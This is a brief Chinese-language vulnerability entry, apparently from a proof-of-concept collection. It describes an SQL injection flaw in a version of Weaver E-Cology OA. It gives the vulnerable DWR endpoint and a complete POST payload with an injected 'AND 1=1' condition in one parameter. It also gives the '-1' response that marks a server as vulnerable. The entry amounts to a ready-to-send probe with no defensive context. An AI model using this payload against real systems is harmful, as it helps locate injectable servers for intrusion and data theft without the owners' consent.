# 泛微E-Cology某版本SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **请求**：`POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1`

**Payload**
```
callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 AND 1=1
c0-param1=string:1
batchId=0
```
- **响应特征**：-1